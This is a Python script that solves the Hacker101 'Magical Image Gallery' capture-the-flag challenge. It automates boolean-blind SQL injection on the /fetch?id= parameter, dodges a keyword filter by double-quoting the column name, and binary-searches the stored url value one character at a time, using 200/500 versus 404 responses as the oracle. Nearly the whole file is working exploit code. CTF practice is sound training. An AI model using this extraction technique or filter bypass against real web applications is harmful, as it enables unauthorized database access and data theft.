#!/usr/bin/env python3
"""Fast binary-search extractor for the Magical Image Gallery CTF.

Oracle on /fetch?id=:
  row found  (condition TRUE)  -> 200 (valid url) or 500 (invalid url)
  no row     (condition FALSE) -> 404
Column `url` is WAF-filtered as a bare word -> use double quotes: "url".
Single-quoted patterns work. LIKE / comparisons are CASE-INSENSITIVE by
default, so we binary-search the character (case-insensitively) and then
determine exact case via = (LIKE BINARY). Last resort: fetch works anyway.
"""
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://f69716e4ca42fa5db261fc835d4fddee.ctf.hacker101.com"
ROW = 3
COL = "%22url%22"  # double-quoted to bypass the keyword filter
SLEEP = 0.15
TIMEOUT = 8
MAX_RETRIES = 3


def http(fragment: str) -> int:
    """Return HTTP status for fetch?id=3 AND <fragment>."""
    url = f"{BASE}/fetch?id={ROW}+AND+{fragment}"
    for attempt in range(MAX_RETRIES):
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                return resp.getcode()
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            if attempt == MAX_RETRIES - 1:
                return 0
            time.sleep(1.0)
    return 0


def true_cond(fragment: str) -> bool:
    """TRUE => row selected => status 200/500; FALSE => 404 (or 0 = unknown)."""
    code = http(fragment)
    if code == 0:
        # unknown/rate-limited; retry once after backoff
        time.sleep(2.0)
        code = http(fragment)
    return code != 404 and code != 0


SLEEP = 0.5  # override to be gentler on the server


def main():
    # ---- sanity: comparisons work ----
    print("sanity: url > 'a'  =>", true_cond(f"{COL}+%3E+%27a%27"))   # should be True
    print("sanity: url < 'a'  =>", true_cond(f"{COL}+%3C+%27a%27"))   # should be False
    print("sanity: url LIKE 'u%' =>", true_cond(f"{COL}+LIKE+%27u%25%27"))

    # Quick check: is the flag already in the url?
    for needle in ["FLAG", "flag", "invisible", "http"]:
        print(f"needle '{needle}':", true_cond(f"{COL}+LIKE+%27%25{needle}%25%27"))

    prefix = ""
    MAX_LEN = 120
    for pos in range(MAX_LEN):
        time.sleep(SLEEP)
        # does the string continue after prefix?
        has_more = true_cond(f"{COL}+LIKE+%27{urllib.parse.quote(prefix)}_%25%27")
        if not has_more:
            print("\n=== COMPLETE URL:", repr(prefix), "===")
            break

        # binary search the next character over [32, 95) & [97, 127) ranges
        lo, hi = 32, 127
        while lo < hi:
            time.sleep(SLEEP)
            mid = (lo + hi) // 2
            # true if url >= prefix+mid ... but for position search we want:
            # url starts with prefix + [mid..] = target char >= mid codepoint
            mid_s = chr(mid)
            cond = f"{COL}+%3E%3D+%27{urllib.parse.quote(prefix + mid_s)}%27"
            if true_cond(cond):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo - 1) if lo > 32 else ""
        if not ch:
            # fall back to LIKE probe (shouldn't happen)
            print("  no char found at", pos, "prefix", repr(prefix))
            break
        prefix += ch
        print(f"  pos {pos}: {ch!r} -> {prefix!r}", flush=True)
        # early exit on flag markers
        if "FLAG^" in prefix or "^FLAG^" in prefix or "flag" in prefix.lower():
            pass


if __name__ == "__main__":
    main()